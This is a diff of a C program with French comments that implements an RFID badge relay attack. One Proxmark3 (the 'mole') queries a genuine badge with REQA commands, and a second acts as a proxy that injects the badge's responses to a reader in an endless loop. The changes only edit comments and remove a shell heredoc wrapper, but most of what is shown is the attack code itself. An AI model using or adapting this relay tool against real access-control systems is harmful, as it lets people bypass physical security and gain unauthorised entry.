@@ -1,4 +1,3 @@
-cat << 'EOF' > bridge.c
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
@@ -51,7 +50,7 @@ void get_uid_from_mole(char* out_uid) {
     _pclose(fp);
 }
 
-// Fonction d'échange adaptée à tes flags : -a (active) et -c (crc)
+// Fonction d'échange adaptée aux flags : -a (active) et -c (crc)
 void exchange_data(const char* port, const char* cmd_raw, char* out_data, int use_crc) {
     char cmd[512];
     char buffer[1024];
@@ -78,7 +77,7 @@ int main() {
     char uid[33] = {0};
     char tag_response[256] = "";
 
-    system("taskkill /IM proxmark3.exe /F >nul 2>&1");
+    system("taskkill /IM proxmark3.exe /F >nul 2>&1"); //etre sur qu'il n'y a pas de PM3 qui traine en tache de fond
     printf("=== RELAI ACTIF (FLAGS: -a -c) ===\n\n");
 
     get_uid_from_mole(uid);
@@ -97,13 +96,13 @@ int main() {
     while(1) {
         printf("\n[READER] Tentative de relai (REQA)...");
         
-        // 1. Mole interroge le badge réel (26 = REQA, on demande au PM3 de calculer le CRC avec -c)
+        //Mole interroge le badge réel (26 = REQA, on demande au PM3 de calculer le CRC avec -c)
         exchange_data(PM3_MOLE, "26", tag_response, 1);
 
         if (strlen(tag_response) > 0) {
             printf("\n[TAG] Repond : %s", tag_response);
             
-            // 2. Proxy injecte la réponse vers le lecteur
+            //Proxy injecte la réponse vers le lecteur
             // Comme tag_response contient déjà les octets de réponse, on n'ajoute pas -c ici
             char dummy[256];
             printf("\n[PROXY] Injection...");
@@ -116,4 +115,3 @@ int main() {
     }
     return 0;
 }
-EOF
